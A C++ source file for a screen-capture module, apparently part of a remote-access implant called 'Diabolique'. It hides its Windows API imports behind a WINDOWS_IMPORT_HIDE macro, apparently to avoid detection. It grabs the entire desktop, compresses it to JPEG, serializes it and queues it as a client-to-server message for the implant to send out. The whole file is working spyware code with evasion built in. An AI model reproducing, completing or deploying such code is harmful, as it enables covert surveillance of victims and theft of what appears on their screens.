#include <CDiaScreenCapture.h>
#include <atlstr.h> 
#include <atlimage.h>
#include <IDiaboliqueConnection.h>
#include <shellscalingapi.h>

CDiaScreenCapture::CDiaScreenCapture()
{
    WINDOWS_IMPORT_HIDE(SetProcessDpiAwareness, "Shcore.dll");
    _SetProcessDpiAwareness(PROCESS_PER_MONITOR_DPI_AWARE);
}

void CDiaScreenCapture::RunInternal()
{
    WINDOWS_IMPORT_HIDE(GetSystemMetrics, "User32.dll");
    WINDOWS_IMPORT_HIDE(GetDC, "User32.dll");

    WINDOWS_IMPORT_HIDE(CreateCompatibleDC, "Gdi32.dll");
    WINDOWS_IMPORT_HIDE(CreateCompatibleBitmap, "Gdi32.dll");
    WINDOWS_IMPORT_HIDE(SelectObject, "Gdi32.dll");
    WINDOWS_IMPORT_HIDE(BitBlt, "Gdi32.dll");
    WINDOWS_IMPORT_HIDE(DeleteDC, "Gdi32.dll");
    //WINDOWS_IMPORT_HIDE(ReleaseDC, "Gdi32.dll");
    WINDOWS_IMPORT_HIDE(DeleteObject, "Gdi32.dll");

    //WINDOWS_IMPORT_HIDE(CreateStreamOnHGlobal, "ole.dll");
    WINDOWS_IMPORT_HIDE(IStream_Size, "Shlwapi.dll");
    WINDOWS_IMPORT_HIDE(IStream_Reset, "Shlwapi.dll");
    WINDOWS_IMPORT_HIDE(IStream_Read, "Shlwapi.dll");
 

    int x, y = 0;
    int x1, y1, x2, y2, w, h;

    // get screen dimensions
    x1 = _GetSystemMetrics(SM_XVIRTUALSCREEN);
    y1 = _GetSystemMetrics(SM_YVIRTUALSCREEN);
    x2 = _GetSystemMetrics(SM_CXVIRTUALSCREEN);
    y2 = _GetSystemMetrics(SM_CYVIRTUALSCREEN);
    w = x2 - x1;
    h = y2 - y1;

    x = w;
    y = h;

    // copy screen to bitmap
    HDC     hScreen = _GetDC(HWND_DESKTOP);
    HDC     hDC = _CreateCompatibleDC(hScreen);
    HBITMAP hBitmap = _CreateCompatibleBitmap(hScreen, w, h);
    HGDIOBJ old_obj = _SelectObject(hDC, hBitmap);
    BOOL    bRet = _BitBlt(hDC, 0, 0, w, h, hScreen, x1, y1, SRCCOPY);


    std::string buf; // std::vector<BYTE>
    IStream* stream = NULL;
    HRESULT hr = CreateStreamOnHGlobal(0, TRUE, &stream);
    CImage image;
    ULARGE_INTEGER liSize;

    // screenshot to jpg and save to stream
    image.Attach(hBitmap);
    image.Save(stream, Gdiplus::ImageFormatJPEG);
    _IStream_Size(stream, &liSize);
    DWORD len = liSize.LowPart;
    _IStream_Reset(stream);
    buf.resize(len);
    _IStream_Read(stream, &buf[0], len);
    stream->Release();

    // clean up
    _SelectObject(hDC, old_obj);
    _DeleteDC(hDC);
    ReleaseDC(NULL, hScreen);
    _DeleteObject(hBitmap);

    screen_capture scap;
    scap.set_width(x);
    scap.set_height(y);

    scap.set_data(buf);

    std::string serialized;

    scap.SerializeToString(&serialized);

    m_TaskDataLock.lock();
    m_TaskData.push_front(std::pair<diabolique_message_type_t, std::string>(diabolique_message_type_t::k_dmCTSScreenCap, serialized));
    m_TaskDataLock.unlock();

    return;
}
